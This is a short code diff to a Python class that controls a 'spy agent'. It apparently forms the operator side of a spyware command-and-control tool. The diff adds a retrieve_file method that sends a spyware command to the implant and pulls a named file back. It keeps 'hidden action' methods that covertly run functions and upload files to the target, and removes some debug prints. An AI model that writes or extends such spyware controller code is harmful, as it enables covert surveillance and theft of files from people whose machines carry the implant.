@@ -3,6 +3,7 @@ from command import Command
 from responce import Responce
 from funCode import FunCode
 from status import Status
+from spywareCmd import SpywareCmd
 
 """this class is for controling 1 spy agent"""
 
@@ -36,6 +37,14 @@ class Agent:
             conn.send_data(fileContent)
             return conn.recv_responce_struct()
 
+    def retrieve_file(self, fileName) -> tuple[Responce, bytes]:
+        with self.connect() as conn:
+            conn.send_data(SpywareCmd(3, 0, 0))
+            conn.send_string(fileName)
+            file_data = conn.recv_file()
+            res = conn.recv_responce_struct()
+            return res, file_data
+
     def hidden_action_without_upload(self, fncode: FunCode) -> tuple[Responce, str]:
         assert FunCode.HIDDEN_UPLOAD not in fncode
 
@@ -46,7 +55,6 @@ class Agent:
             results.append(conn.recv_bytes(Status.sizeof))
             results.append(conn.recv_bytes(Status.sizeof))
             return conn.recv_full_responce(), results
-            return conn.recv_full_responce()
 
     def hidden_action_with_upload(
         self, fncode: FunCode, homeFilePath, targetFileName: str
@@ -64,14 +72,9 @@ class Agent:
             )
             conn.send_data(fileContent)
             results = list()
-            print(f"{results = }")
             results.append(conn.recv_responce_struct())
-            print(f"{results = }")
             results.append(conn.recv_responce_struct())
-            print(f"{results = }")
             results.append(conn.recv_responce_struct())
-            print(f"{results = }")
-            print(f"results = {results}")
             return conn.recv_full_responce(), results
 
     # prob redundant in future
